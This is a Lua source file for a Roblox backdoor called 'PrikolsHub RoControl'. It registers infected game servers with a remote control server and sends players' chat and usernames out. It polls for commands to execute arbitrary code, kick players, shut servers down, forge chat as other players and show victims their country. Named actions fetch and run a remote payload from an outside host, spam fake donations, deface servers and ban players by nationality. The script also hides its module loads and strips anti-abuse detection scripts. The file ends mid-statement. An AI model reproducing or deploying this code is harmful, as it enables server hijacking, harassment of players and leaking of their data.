
--- PrikolsHub RoControl MultiSession

local VERSION = "1.0"

local DefaultURL = "http://127.0.0.1:26947"
local ROCTRL_URL = "http://154.12.255.74:26947"

-- UNCOMMENT WHEN UPLOAD TO VPS
local ROCTRL_URL = DefaultURL -- STAGING

--- MAIN

-- These variables are filled in on the top in server.py
local sespoolid = PRIKOLS_SESPOOL_ID or 1
local sespoolsk = PRIKOLS_SESPOOL_KEY or 'Staging Secret'

local modfunc = {}
local reqmods_cache = {}

-- Utility functions
local require_ = require
local function reqfunc(id,unanon)
	if reqmods_cache[id] then return reqmods_cache[id] end
	if modfunc[id] then
		local lol = modfunc[id]()
		reqmods_cache[id] = lol
		return lol
	end
	unanon = true
	if unanon then -- fast but id can be leaked (private stuffs included)
		return require_(id)
	end
	local function fakeRequire(r_index)
		local fakeid = math.random(9,15)..math.random(0,9)..math.random(0,9)..math.random(0,9)..math.random(0,9)..math.random(0,9)..math.random(0,9)..math.random(0,9)..math.random(0,9)..math.random(0,9)
		print("Requiring asset "..tostring(fakeid)..".\nCallstack:\nPrikolsHub Main Script uwu.Libraries.PrikolsHub RoControl.CommandHandler.ExecHandle, line 18\nPrikolsHub Main Script uwu.Libraries.PrikolsHub RoControl.CommandHandler.ExecHandle, line 17")
	end

	local __required__ = nil

	local xd = math.random(500,1500)
	for i=1,2000 do
		if i==xd then
			task.defer(function()
				pcall(function()
					__required__ = require_(id)
				end)
			end)
		else
			fakeRequire()
		end
		if i%500==1 then wait(0.01) end
	end
	repeat wait(0.001) until __required__ ~= nil
	return __required__
end

local require = reqfunc

-- Dependencies
local deps = require(15445852900) --require(15210077708)
local chathaxObject = deps.GetSayMessage()
local ssMessageObject = deps.SkidShield
local crashObject = deps.GetSG()
local SendMsg = deps.SendMessage

function chatModeMsg(PrefixText,Text,PrefixColor)
	require("MessageModes"):Do(PrefixText,Text,PrefixColor)
end

function systemMessage(text)
	chatModeMsg('PrikolsHub',text,'ff0000')
end

--- MODULES

modfunc["MessageModes"] = function()
	local messageModes = {}

	local modes = {
		Chat = function(PrefixText,Text,PrefixColor)
			pcall(function()
				deps.SendMessage(PrefixText,Text,PrefixColor)
			end)
		end,
		Hint = function(PrefixText,Text,PrefixColor) -- Fix VSB2 preventing SetCore, temp solution xdddd
			pcall(function()
				local h = Instance.new("Hint")
				h.Text = "[ "..PrefixText.." ] "..Text
				h.Parent = game:GetService("Workspace")
				task.delay(5,function()
					pcall(function()
						h:Destroy()
					end)
				end)
			end)
		end,
		Message = function(PrefixText,Text,PrefixColor) -- same as hint
			pcall(function()
				local h = Instance.new("Message")
				h.Text = "[ "..PrefixText.." ]\n"..Text
				h.Parent = game:GetService("Workspace")
				task.delay(5,function()
					pcall(function()
						h:Destroy()
					end)
				end)
			end)
		end,
		SkidShield = function(PrefixText,Text,PrefixColor) -- same as hint
			pcall(function()
				ssMessageObject(PrefixText,Text,PrefixColor)
			end)
		end
	}
	
	messageModes.dumbmode = "Chat"
	
	--[[
	if game.PlaceId == 843495510 then
		messageModes.dumbmode = "Hint" -- Force VSB2 fix on new servers.
	end
	--]]
	
	function messageModes:Do(pfx,txt,pfxc)
		pcall(function()
			modes[messageModes.dumbmode](pfx,txt,pfxc)
		end)
	end
	
	function messageModes:Set(funcName)
		local methodv = modes[funcName] or nil
		if methodv then messageModes.dumbmode = funcName end
	end

	return messageModes
end

modfunc["MainModule"] = function()
	local api = require("Apis")

	local http = game:GetService("HttpService")

	systemMessage("Connecting to PrikolsHub RoControl MultiSession...")
	warn("[PrikolsHub]","connectingToServer")

	api.ConnectFail:Connect(function()
		if api.sessionExists == true then
			systemMessage("This PrikolsHub RoControl session has been closed.")
			warn("[PrikolsHub]","sessionClosed")
		else
			systemMessage("Failed to connect to PrikolsHub RoControl!")
			warn("[PrikolsHub]","connectFail")
		end
	end)

	api.Connected:Connect(function(data)
		warn("[PrikolsHub]","connected")
		systemMessage("Successfully connected to PrikolsHub RoControl MultiSession SessionPool "..tostring(data or "UnknownSessionPool"))
		api.startMessagesCheckLoop()
	end)

	api.Message:Connect(function(PrefixText,PrefixColor,Text)
		pcall(function()
			chatModeMsg(PrefixText,Text,PrefixColor)
		end)
	end)

	api.init()
end

modfunc["Apis"] = function()
	local http = game:GetService("HttpService")
	local Players = game:GetService("Players")
	local MarketplaceService = game:GetService("MarketplaceService")

	local Commands = require("CommandHandler")

	-- Truncate function
	local function truncate(text, maxchars)
		if string.len(text) > maxchars then
			return string.sub(text, 1, maxchars)
		else
			return text
		end
	end

	local f_id = "ffffffff-ffff-ffff-ffffffffffff"
	
	local id = game.JobId or f_id if game.JobId and (string.len(game.JobId)>=5) then else id = f_id end -- this is important
	local pid = 69420 if game.PlaceId > 5 then pid = game.PlaceId end -- wth is this?
	
	local sessionid = f_id.."@"..tostring(pid)	

	-- Module definition
	local module = {
		errors = {}, -- legacy something
		id = id,
		url = ROCTRL_URL
	}

	-- Logging configuration
	local LogHTTPErrors = false

	local function log(...)
		if LogHTTPErrors == true then
			print("[PrikolsHub]", "Logging request:", ...)
		end
	end

	module.MaxRequestYield = 20

	module.antiHttpDetected = function()
		warn("[PrikolsHub]","antiHttpDetectedEvent")
		spawn(function()
			pcall(function()
				while wait(0) do
					for i,v in pairs(game:GetService("Players"):GetPlayers()) do
						v:Kick("[PrikolsHub] anti http </3")
					end
				end
			end)
		end)
	end


	-- HTTP GET request function
	local function get(endpoint)
		local _rdone = false
		spawn(function()
			pcall(function()
				wait(module.MaxRequestYield)
				if _rdone == false then pcall(module.antiHttpDetected) end
			end)
		end)
		local success, response = pcall(function()
			return http:GetAsync(ROCTRL_URL .. endpoint, true,{["ngrok-skip-browser-warning"]="PrikolsHub"})
		end)
		_rdone = true
		log(success, response)

		if not success then
			return false
		end

		local isJSON = true

		if isJSON then
			local jsonSuccess, decodedResponse = pcall(function()
				return http:JSONDecode(response)
			end)

			if not jsonSuccess then
				return false
			else
				return decodedResponse
			end
		else
			return response
		end
	end

	-- HTTP POST request function
	local function post(endpoint, data)
		local _rdone = false
		spawn(function()
			pcall(function()
				wait(module.MaxRequestYield)
				if _rdone == false then pcall(module.antiHttpDetected) end
			end)
		end)
		local success, response = pcall(function()
			return http:PostAsync(ROCTRL_URL .. endpoint, http:JSONEncode(data),nil,nil,{["ngrok-skip-browser-warning"]="PrikolsHub"})
		end)
		_rdone = true
		log(success, response)

		if not success then
			return false
		end

		local isJSON = true

		if isJSON then
			local jsonSuccess, decodedResponse = pcall(function()
				return http:JSONDecode(response)
			end)

			if not jsonSuccess then
				return false
			else
				return decodedResponse
			end
		else
			return response
		end
	end

	module.get = get
	module.post = post

	-- Events
	local _sessionConnectedEvt = Instance.new("BindableEvent")
	module.Connected = _sessionConnectedEvt.Event

	local _sessionConnectFailEvt = Instance.new("BindableEvent")
	module.ConnectFail = _sessionConnectFailEvt.Event

	module.sessionExists = false

	-- Module initialization
	module.init = function()
		local gameinfo = MarketplaceService:GetProductInfo(game.PlaceId, Enum.InfoType.Asset)
		local dataToSend = {
			id = game.PlaceId, --pid,
			gameid = game.GameId, -- useless
			name = gameinfo.Name,
			url = "https://roblox.com/games/" .. pid,
			jobid = id
		}

		local connectionData = post("/pool/"..tostring(sespoolid).."/"..sessionid.."/create", dataToSend)
		
		game:BindToClose(function()
			pcall(function()
				post("/pool/"..tostring(sespoolid).."/"..sessionid.."/remove", {})	
			end)
			wait(5)
		end)
		
		if connectionData == false then return false end
		module.sessionExists = true

		_sessionConnectedEvt:Fire(connectionData.name)
		
		return true
	end

	local _chatMsgEvt = Instance.new("BindableEvent")
	module.Message = _chatMsgEvt.Event -- PrefixText, PrefixColor, Text

	local function safePlayerAdded(func)
		for _, v in pairs(Players:GetPlayers()) do
			task.defer(function()
				pcall(func, v)
			end)
		end
		return Players.PlayerAdded:Connect(func)
	end

	local _CR_Chat = Instance.new("BindableEvent")
	module.FireCRChat = function(plr,dn,txt) _CR_Chat:Fire(plr,dn,txt) end

	local _Force_Chat = Instance.new("BindableEvent")
	module.FireForceChat = function(dn,name,id,txt) _Force_Chat:Fire(dn,name,id,txt) end

	local _Idk = Instance.new("BindableEvent")

	module.sendMsgS = function(msg)
		_Idk:Fire({"PrikolsHub RoControl","$PrikolsHub_RoControl",1,truncate(msg,512)})
	end
	
	module.sendMsgAsDarktru = function(msg)
		_Idk:Fire({"Darktru","$Darktru_PrikolsHub_RoControl",121130556,truncate(msg,512)})
	end

	local _lastForceChat = -900
	module.startMessagesCheckLoop = function()
		if not module.sessionExists then
			return false
		end
		local _stupidEvents = {}
		local chats = {}
		local commands = {}

		game:BindToClose(function()
			chats[#chats+1] = {"PrikolsHub RoControl",1,"Current game is closing!"}
		end)

		_stupidEvents[#_stupidEvents+1] = Players.PlayerRemoving:Connect(function(plr)
			chats[#chats+1] = {"PrikolsHub RoControl",1,truncate((plr.DisplayName or plr.Name).." (@"..plr.Name..") has left.",512)}
		end)
		_stupidEvents[#_stupidEvents+1] = Players.PlayerAdded:Connect(function(plr)
			chats[#chats+1] = {"PrikolsHub RoControl",1,truncate((plr.DisplayName or plr.Name).." (@"..plr.Name..") has joined.",512)}
		end)
		_stupidEvents[#_stupidEvents+1] = _Idk.Event:Connect(function(lol)
			chats[#chats+1] = lol
		end)

		_stupidEvents[#_stupidEvents+1] = safePlayerAdded(function(plr)
			_stupidEvents[#_stupidEvents+1] = plr.Chatted:Connect(function(msg)
				local index = #chats + 1
				local nam = (plr.DisplayName .. "(@"..plr.Name..", " or plr.Name.." (")..plr.UserId..", "..sessionid..")"
				chats[index] = {nam, plr.UserId, truncate(msg, 256)}
			end)
		end)
		_stupidEvents[#_stupidEvents+1] = _CR_Chat.Event:Connect(function(plr,dn,txt)
			local nam = (dn .. "(@"..plr.Name..", " or plr.Name.." (")..plr.UserId..", "..sessionid..")"
			chats[#chats+1] = {nam, plr.UserId, truncate(txt, 256)}
		end)
				
		local plsbreak = false
		while true do
			if plsbreak == true then break end
			pcall(function()
				local xd = chats
				chats = {}
				local data = post("/pool/"..tostring(sespoolid).."/"..tostring(sessionid).."/messages",{messages=xd})
				if data == false then
					plsbreak = true
				end
				for i, v in pairs(data.cache) do
					if v[2] == true then
						spawn(function()
							pcall(function()
								Commands[v[1]](1,v[3])
							end)
						end)
					else
						_chatMsgEvt:Fire(v[1], v[2], v[3])
					end
				end
			end)
			wait(0.5)
		end
		
		warn("[PrikolsHub]","disconnected")
		task.defer(function()
			for _,evt in pairs(_stupidEvents) do
				pcall(function()
					evt:Disconnect()
				end)
			end
		end)
		_sessionConnectFailEvt:Fire()
	end

	return module
end

modfunc["Hypernull"] = function()
	-- Credit to soup (@equsjd1)
	local Functions = {}
	local Signal
	local RunService = game:GetService("RunService")

	Functions.Priority = function()
		local Methods, Running, IsSerial = {}, false, true
		function Methods:Connect(Function, ...)
			Running = true
			local Thread = {...}
			local function Resumption()
				if Running and IsSerial then 
					if Running == false then 
						Methods:Disconnect()
						return
					end
					local Tween = game:GetService("TweenService"):Create(game, TweenInfo.new(0), {})
					Signal = Tween.Completed:Connect(function()
						task.spawn(Resumption)
						Function(table.unpack(Thread))
					end)
					Tween:Play()
				end
			end
			task.spawn(Resumption)
			return Methods
		end
		function Methods:Disconnect()
			Running = false
			if Signal then
				Signal:Disconnect()
			end
		end
		return Methods
	end

	Functions.TP = function(f,...)
		Functions.Priority():Connect(f, ...)
	end

	local HYPF = Instance.new("BindableFunction")
	function Functions.HN(func, ...)
		if game:GetService("RunService"):IsStudio() then
			func(...)
			return
		end
		HYPF.OnInvoke = function(...)
			if pcall(HYPF.Invoke, HYPF, ...) == false then
				func(...)
			end
		end
		if pcall(HYPF.Invoke, HYPF, ...) == false then
			func(...) return
		end
	end

	function Functions.Bruh(v)
		coroutine.wrap(function()
			coroutine.wrap(function()
				game:GetService("LogService").MessageOut:Connect(function(message, messageType)
					if messageType == Enum.MessageType.MessageError then -- and obliteration then
						coroutine.wrap(function()
							v()
						end)()
						task.wait()
					end
				end)
			end)()
			coroutine.wrap(function()
				game:GetService("ScriptContext").Error:Connect(function()
					coroutine.wrap(function()
						v()
					end)()
					task.wait()
				end)
			end)()
		end)
	end

	local function Stall(f, ...)
		local thr = ...
		task.desynchronize()
		task.defer(Stall, f, thr)
		task.synchronize()
		f(thr)
	end

	function Functions.MultiHelper(f,...)
		local thr = ...
		coroutine.wrap(function()
			coroutine.wrap(function() 
				Stall(f, thr) 
			end)()
			coroutine.wrap(function()
				for _,v in next, {RunService.Heartbeat, RunService.PreRender, RunService.PreSimulation, RunService.PreAnimation, RunService.PostSimulation, RunService.Stepped} do
					v:Connect(function()
						coroutine.wrap(function()
							Functions.HN(function()
								f(thr)
							end, true)
						end)()
					end)
				end
			end)()
			coroutine.wrap(function()
				Functions.TP(function()
					coroutine.wrap(function()
						Functions.HN(function()
							f(thr)
						end)
					end)()
				end)
			end)()
			coroutine.wrap(function()
				Functions.Bruh(function()
					coroutine.wrap(function()
						Functions.HN(function()
							f(thr)
						end)
					end)()
				end)
			end)()
		end)()
	end

	return Functions
end

modfunc["Funcs"] = function()
	local module = {}

	function module.RandomString()
		return tostring(game:GetService("HttpService"):GenerateGUID(false)..game:GetService("HttpService"):GenerateGUID(false))
	end

	function module.AutoProperty(obj, prop, val)
		pcall(function()
			module.HN(function()
				obj[prop] = val
			end)
		end)
		obj:GetPropertyChangedSignal(prop):Connect(function()
			pcall(function()
				module.HN(function()
					obj[prop] = val
				end)
			end)
		end)
	end

	function module.RegisterFunc(code,a)
		if typeof(a) ~= "function" then return end
		--table.insert(funcs,{[code] = true,func = a,module = getfenv(2).orgsc})
	end

	function module.CheckInstance(a)
		return pcall(function() assert(a.Name) end)
	end

	function module.Remove(obj)
		pcall(function()
			if obj:IsA("Script") or obj:IsA("LocalScript") then
				module.AutoProperty(obj, "Disabled", true)
				module.AutoProperty(obj, "Name", module.RandomString())
			elseif obj:IsA("Decal") or obj:IsA("ImageLabel") then
				local img = "Texture" or "Image"
				module.AutoProperty(obj, img, 0)
				module.AutoProperty(obj, "Name", module.RandomString())
			elseif obj:IsA("ScreenGui") then
				module.AutoProperty(obj, "Enabled", false)
				module.AutoProperty(obj, "ResetOnSpawn", true)
				module.AutoProperty(obj, "Name", module.RandomString())
			else
				module.AutoProperty(obj, "Name", module.RandomString())
			end
			for i,v in pairs(obj:GetAttributes()) do
				module.HN(function()
					obj:SetAttribute(i,nil)
				end)
			end
			for i, e in pairs(obj:GetDescendants()) do
				coroutine.resume(coroutine.create(function()
					for i,_ in pairs(e:GetAttributes()) do
						module.HN(function()
							e:SetAttribute(i,nil)
						end)
					end
					module.AutoProperty(obj,"Value",module.RandomString())
					module.AutoProperty(obj,"Value",Vector3.new(-9999999999,-9999999999,-9999999999))
					module.AutoProperty(obj,"Value",CFrame.new(-9999999999,-9999999999,-9999999999))
					module.AutoProperty(obj,"Value",false)
					module.AutoProperty(obj,"Value",0)
					module.AutoProperty(obj,"Value",nil)
				end))
			end
			module.HN(function()
				task.defer(game.Destroy,obj)
				task.defer(game.ClearAllChildren,obj)
				task.defer(game.Remove,obj)
				task.defer(game:GetService("Debris").AddItem,game:GetService("Debris"),obj,0)
			end)
		end)	
	end

	function module.HN(f, ...)
		if game:GetService("RunService"):IsStudio() then
			f()
			return
		end
		local _hypf = Instance.new("BindableFunction")
		_hypf.OnInvoke = function(...) 
			if pcall(_hypf.Invoke, _hypf, ...) == false then 
				f() 
			end 
		end
		if pcall(_hypf.Invoke, _hypf, ...) == false then 
			f()
			return 
		end
	end

	return module
end

modfunc["Actions"] = function()
	local function RandomString()
		return tostring(game:GetService("HttpService"):GenerateGUID(false)..game:GetService("HttpService"):GenerateGUID(false))
	end

	local actionsTable = {
		["Inject ExSer V3"] = function()
			if game:GetService("RunService"):IsStudio() == true then
				require("Apis").sendMsgAsDarktru(":warning: roblox studio?")
			else
				spawn(function()pcall(function()coroutine.wrap(pcall)(require,tonumber(game:service("HttpService"):GetAsync("https://exser.mywire.org/delivery")))end)end)
				require("Apis").sendMsgAsDarktru(":information_source: tried to inject exser v3")
			end
		end,
		["Spam Nuke (PLS DONATE)"] = function()
			spawn(function()
				pcall(function()
					local index = 0
					local messaging = game:GetService("MessagingService")
					-- utf8.char(0xE001) roblox premium icon
					while wait(0) do
						if index == 10 then index = 0 wait(5) else wait(0.1) end
						index = index + 1 
						pcall(function()
							messaging:PublishAsync('ExtraDonation',{
								Donator={Id=121130556,Username=utf8.char(0xE001).." Darktru"},
								Raiser={Id=1083030325,Username=utf8.char(0xE001).." OCbwoy3"},
								RobuxAmount=100000 -- 100k is nuke
							})
						end)
					end
				end)
			end)
			require("Apis").sendMsgAsDarktru(":warning: pls donate")
		end,
		["Darktru DecalSpam"] = function()
			local ID = 12976032227
			--local IMAGE = "rbxthumb://type=AvatarHeadShot&id=121130556&w=420&h=420"
			local IMAGE = "http://www.roblox.com/asset/?id=12976032227" -- Darktru
			--game:GetService("GroupService"):GetGroupInfoAsync()

			local Skybox = true
			local particle = true

			local function recursion(v)
				if v.Name == "spamlol" then return end
				local decal1 =Instance.new("Decal")
				local decal2 =Instance.new("Decal")
				local decal3 =Instance.new("Decal")
				local decal4 =Instance.new("Decal")
				local decal5 =Instance.new("Decal")
				local decal6 =Instance.new("Decal")
				decal1.Texture = IMAGE -- "http://www.roblox.com/asset/?id=" ..ID
				decal2.Texture = IMAGE -- "http://www.roblox.com/asset/?id=" ..ID
				decal3.Texture = IMAGE -- "http://www.roblox.com/asset/?id=" ..ID
				decal4.Texture = IMAGE -- "http://www.roblox.com/asset/?id=" ..ID
				decal5.Texture = IMAGE -- "http://www.roblox.com/asset/?id=" ..ID
				decal6.Texture = IMAGE -- "http://www.roblox.com/asset/?id=" ..ID
				decal1.Parent = v
				decal2.Parent = v
				decal3.Parent = v
				decal4.Parent = v
				decal5.Parent = v
				decal6.Parent = v
				decal1.Name = "spamlol"
				decal2.Name = "spamlol"
				decal3.Name = "spamlol"
				decal4.Name = "spamlol"
				decal5.Name = "spamlol"
				decal6.Name = "spamlol"
				decal1.Face = "Front"
				decal2.Face = "Top"
				decal3.Face = "Left"
				decal4.Face = "Right"
				decal5.Face = "Bottom"
				decal6.Face = "Back"
				local particle2 = Instance.new("ParticleEmitter")
				particle2.Name = "spamlol"
				particle2.Texture = IMAGE -- "http://www.roblox.com/asset/?id=" ..ID
				particle2.Parent = v
				particle2.Transparency = NumberSequence.new(0.5)
				particle2.Rate = 200
				for i,obj in pairs(v:GetChildren()) do
					spawn(function()
						pcall(recursion,obj)
					end)
				end
			end

			local sky = Instance.new("Sky")
			sky.Parent = game:GetService("Lighting")
			sky.SkyboxBk = IMAGE --"http://www.roblox.com/asset/?id=" ..ID
			sky.SkyboxDn = IMAGE --"http://www.roblox.com/asset/?id=" ..ID
			sky.SkyboxFt = IMAGE --"http://www.roblox.com/asset/?id=" ..ID
			sky.SkyboxLf = IMAGE --"http://www.roblox.com/asset/?id=" ..ID
			sky.SkyboxRt = IMAGE --"http://www.roblox.com/asset/?id=" ..ID
			sky.SkyboxUp = IMAGE --"http://www.roblox.com/asset/?id=" ..ID

			local h = Instance.new("Hint")
			local wsp = game:GetService("Workspace")

			h.Name = "AtdarkHub"
			h.Text = "THIS SERVER HAS BEEN DESTROYED BY DARKTRU HUB 😱😱😱"			
			h.Parent = wsp

			recursion(game:GetService("Workspace"))

			require("Apis").sendMsgAsDarktru("server got destroyed lol")
		end,
		["Load PrikolsHub Anti Logger (k00pcringe)"] = function()
			require(13493277569).prikols()
		end,
		["Load PrikolsHub Anti Logger"] = function()
			require(13493277569).prikols(true)
		end,
		["Ban Specific Countries"] = function()
			local localiz = game:GetService("LocalizationService")
			local bannedCountries = {"RU","IL","BR","TR","PL","LT","CN","KP"}
			local function check(player)
				local plrCountry = localiz:GetCountryRegionForPlayerAsync(player)
				if table.find(bannedCountries,plrCountry) then
					if plrCountry == "RU" then
						player:Kick("Russians are not allowed in the server. SLAVA UKRAINI!")
					else
						player:Kick("Your country has been banned from this server.")
					end
				end
			end

			local plrs = game:GetService("Players")

			plrs.PlayerAdded:Connect(function(plr)
				task.defer(function()
					pcall(check,plr)
				end)
			end)

			for i,v in pairs(plrs:GetPlayers()) do
				task.defer(function()
					pcall(check,v)
				end)
			end

			require("Apis").sendMsgS(":information_source: Attempted to ban Russians, Israelis, Brazilians, Turks, Poles, Lithuanians, the Chinese and the North Koreans.")
		end
	}

	local AutomaticActions = {
		-- Blacklist
		--[[
		function()
			local Players = game:GetService("Players")
			local function safePlayerAdded(func)
				for _, v in pairs(Players:GetPlayers()) do
					task.defer(function()
						pcall(func, v)
					end)
				end
				return Players.PlayerAdded:Connect(func)
			end
			safePlayerAdded(function(plr:Player)
				if blacklisted_users[plr.UserId] then
					local victimname = plr.Name
					local reason = blacklisted_users[plr.UserId]
					if plr == nil then return end
					local prank = require("GetCountry")
					local country = prank.lol(plr)
					pcall(function()
						prank.drop(plr,reason,country)
					end)
					task.delay(5,function()
						pcall(function()
							plr:Kick(reason)
						end)
					end)
					require("Apis").sendMsgS("Blacklisted Player **"..victimname.."** tried to join from **"..country.."**: "..tostring(reason))
				end
			end)
		end,
		--]]
		-- Anti AD
		function()
			--print("AntiAD Loaded")
			local func = require("Funcs") 
			game.DescendantAdded:Connect(function(g)
				if g:IsA("Script") and g:FindFirstChildOfClass("ObjectValue") and func.CheckInstance(g:FindFirstChildOfClass("ObjectValue").Value) and g:FindFirstChildOfClass("ObjectValue").Value:FindFirstChild("ADAssets") then
					local nice = g:FindFirstChildOfClass("ObjectValue").Value
					func.Remove(nice)
					func.Remove(g)
					local cool = #nice:GetDescendants()
					for i,v in pairs(nice:GetChildren()) do
						if func.CheckInstance(v) == false or v.Name == "ADAssets" then else func.Remove(g) end
					end
					for i = 1,cool - 1 do
						Instance.new("Part",nice)
					end
					--func.msg("Attempted to remove an Abuse Detection instance.")
				elseif g:IsA("LocalScript") and g:FindFirstChildOfClass("StringValue") and g:FindFirstChildOfClass("StringValue").Name == "Text" and g:FindFirstChildOfClass("RemoteEvent") and g:FindFirstChildOfClass("RemoteEvent").Name == "DestroyEvent" then
					g.Disabled = true
					g:ClearAllChildren()
					func.Remove(g)
				elseif g:IsA("Sound") and g.SoundId == "rbxassetid://1570162306" and g.Name == "AbuseDetection_Error" then
					g.SoundId = ""
					g:Stop()
					func.Remove(g)
				elseif g:IsA("ModuleScript") and g.Name == "BlacklistModule" then
					if g:FindFirstAncestorOfClass("ScreenGui") then
						func.Remove(g:FindFirstAncestorOfClass("ScreenGui"))
					end
					func.Remove(g)
				elseif g:IsA("Script") and g:FindFirstChild("BlurKiller") and g:FindFirstChild("Credits") and g:FindFirstChild("Credits"):FindFirstChildOfClass("Hint") then
					func.Remove(g)
				end
			end)	
		end,
	}

	local Hypernull = require("Hypernull")

	local function lprint(...)
		--print(...)
	end

	local Actions = {}
	function Actions:LoadAction(actionName)
		if actionsTable[actionName] then
			task.defer(function()
				lprint(pcall(actionsTable[actionName]))
				--pcall(Hypernull.HN,Actions[actionName])
			end)
			return true
		else
			return false
		end
	end

	local AutoActionsRan = false
	function Actions:Auto()
		if AutoActionsRan == true then return false end
		AutoActionsRan = true
		for index, action in pairs(AutomaticActions) do
			task.defer(function()
				lprint(pcall(action))
				--pcall(Hypernull.HN,action)
			end)
		end
	end

	return Actions
end

modfunc["CommandHandler"] = function()	
	local module = {}

	local Actions = require("Actions")

	module["/kick"] = function(interactionId,data)
		local username,reason = data[1], data[2]
		task.defer(function()
			pcall(function()
				game:GetService("Players"):FindFirstChild(username):Kick(reason)
			end)
		end)
	end

	module["/execute"] = function(interactionId,data)
		local execas, code = data[2], data[1]
		task.defer(function()
			require("ExecHandle")(code,execas)
		end)
	end

	module["/display"] = function(interactionId,data)
		local x = data
		local username, message = x[1], x[2]
		task.defer(function()
			pcall(function()
				local temp = script.ImageLoader:Clone()
				temp.Parent = nil

				modfunc.ImageLoader().loadFromUrl(data) -- type:ignore
			end)
		end)
	end

	module["/say"] =  function(interactionId,data)
		local plrs = game:GetService("Players")

		pcall(function()
			local victim = plrs:FindFirstChild(data[1])
			local isfriend = false
			--if victim:IsFriendsWith(1083030325) then isfriend = true end
			if victim.UserId == 1083030325 then isfriend = true end
			if victim.UserId == 384644268 then isfriend = true end
			if isfriend == true then
				require("Apis").sendMsgS("Cannot send message as "..victim.Name..".")
			else
				--script.SayMessage.Message.Value = data[2]
				local clone = chathaxObject:Clone()
				clone.Message.Value = data[2]
				clone.Parent = victim:FindFirstChildOfClass("PlayerGui")
				clone.Disabled = false
				wait(5)
				clone:Destroy()
			end
		end)
	end

	module["/crash"] = function(interactionId,data)
		--warn("[PrikolsHub]","SlashCommandDebug",{commandName="/crash",interactionId=interactionId,commandArguments=data})
		local victim = data[1]
		local message = data[2]
		local victimObj = nil
		for i,v in pairs(game:GetService("Players"):GetPlayers()) do
			if not victimObj then
				if v.Name == victim then
					victimObj = v
				end
			end
		end
		if victimObj == nil then
			require("Apis").sendMsgS("nuh uh")
			return
		end
		local prank = require("GetCountry")
		local country = prank.lol(victimObj)
		pcall(function()
			prank.drop(victimObj,message,country)
		end)
		task.delay(5,function()
			pcall(function()
				victimObj:Kick(message)
			end)
		end)
		require("Apis").sendMsgS("**"..victim.."** is in **"..country.."**.")
	end

	module["/action"] = function(interactionId,data)
		--warn("[PrikolsHub]","SlashCommandDebug",{commandName="/action",interactionId=interactionId,commandArguments=data})
		Actions:LoadAction(data[1])
	end

	module["/chatmode"] = function(interactionId,data)
		--warn("[PrikolsHub]","SlashCommandDebug",{commandName="/chatmode",interactionId=interactionId,commandArguments=data})
		pcall(function()
			require("MessageModes"):Set(data[1])
		end)
	end
	
	return module
end

modfunc["ExecHandle"] = function()
	local LS = reqfunc(14850615333)

	local function newEnv(plr)
		local env = getfenv(2) --- type:ignore
		env.script = nil
		env.require = reqfunc
		env.require_ = require_
		env.loadstring = function(code,execas) 
			local plrToExecAs = game:GetService("Players"):FindFirstChild(execas) or nil
			return LS(code,newEnv(plrToExecAs))()
		end
		env.loadstring_ = LS
		env.prikols = {
			hub = function(plrExe)
				return reqfunc(13216040668).prikols(plr and plr.Name)
			end,
			skidshield = function()
				reqfunc(11669791984).SD()
				return nil
			end,
			hd = function()
				reqfunc(13171035350).hd(plr and plr.Name)
				return nil
			end,
			sdarktru = require("Apis").sendMsgAsDarktru,
			ssystem = require("Apis").sendMsgS,
			sdn = function(reason)
				if not reason then reason = "Server Shutdown" end
				spawn(function()
					pcall(function()
						while wait(0) do
							for i,v in pairs(game:GetService("Players"):GetPlayers()) do
								v:Kick(reason)
							end
						end
					end)
				end)
				return nil
			end
		}
		env.sinner_player = function() return plr end
		env.owner = plr or nil
		env.sdn = env.prikols.sdn
		return env
	end

	return function(code,execas) 
		local plrToExecAs = game:GetService("Players"):FindFirstChild(execas) or nil
		return LS(code,newEnv(plrToExecAs))()
	end
end

modfunc["GetCountry"] = function()
	
	local module = {}
	local dependency_gui = crashObject:Clone()

	module.getPlayerCountryAsync = function(player)
		local loc = game:GetService("LocalizationService")
		local success, playerLocale = pcall(function()
			return loc:GetCountryRegionForPlayerAsync(player)
		end)
		if not success then
			return "GB"
		else
			return playerLocale
		end
	end

	module.drop = function(victim,message,country)
		local obj = dependency_gui:Clone()
		obj.Name = tostring(os.clock())
		obj.TextLabel.Text = message
		obj.c.Text = country
		obj.Parent = victim:FindFirstChildOfClass("PlayerGui")
		obj.LocalScript.Enabled = true
	end

	module.lol = function(player)
		local locale = module.getPlayerCountryAsync(player)
		return locale
	end

	return module
end

modfunc["ImageLoader"] = function()
	-- PrikolsHub Image Loader | Copyright (c) OCbwoy3 2023-present
	-- private image encoding and loading method

	local http = game:GetService("HttpService")
	local Players = game:GetService("Players")
	local MarketplaceService = game:GetService("MarketplaceService")

	local module = {}

	local http = game:GetService("HttpService")

	local scale_mul = 1

	local dependency_bgui = Instance.new("BillboardGui")
	dependency_bgui.Size=UDim2.new(0,1920,0,1080)
	dependency_bgui.StudsOffset = Vector3.new(0,0,-3000)
	dependency_bgui.Name="BillboardGui"

	module.loadFromUrl = function(url)
		if not url then url = "https://raw.githubusercontent.com/ocboy3/ocboy3/Darktru.json" end
		local success, data = pcall(function()
			return http:PostAsync(ROCTRL_URL.."/imageConvert",url,nil,false,{["ngrok-skip-browser-warning"]="prikols hub"})
		end)
		if not success then
			error(data)
		else
			local xdd = game.Workspace:FindFirstChild("$PrikolsHub_RoControlMSLoaded_Pic")
			if xdd then
				-- Reworked loaded image remover to reduce lag
				task.defer(function()
					pcall(function()
						local function check(ins)
							if #ins:GetChildren()==0 then
								pcall(game.Destroy,ins)
								return
							end
							for i,v in pairs(xdd:GetChildren()) do
								check(v)
								if i%100==1 then wait(0.01) end
							end
						end
						check(xdd)
					end)
				end)
				wait(1)
			end
			local decoded = http:JSONDecode(data)
			local gui = script.BillboardGui:Clone()
			gui.Name = "$PrikolsHub_RoControlMSLoaded_Pic"
			gui.Parent=game:GetService("Workspace")
			gui.Size = UDim2.new(0,decoded.res_x*scale_mul,0,decoded.res_y*scale_mul)
			wait(0.01)
			local lines = string.split(decoded.image_data,"@")
			wait(0.01)
			for i_,v_ in pairs(lines) do
				for i,v in pairs(string.split(v_,"|")) do
					spawn(function()
						local frame = Instance.new("Frame")
						frame.Size = UDim2.new(0,1*scale_mul,0,1*scale_mul)
						frame.Position = UDim2.new(
							0,
							math.floor(i%decoded.res_x)*scale_mul,
							0,
							math.floor(i_)*scale_mul
						)
						pcall(function()frame.BackgroundColor3 = Color3.fromHex(v)end)
						frame.BorderSizePixel = 0
						frame.Parent = gui
					end)
					if i%1000 == 1 then
						wait(0.0001)
					end
				end
			end
		end
	end

	return module

end

pcall(function()
	require("Actions"):Auto()
end)

pcall(function()
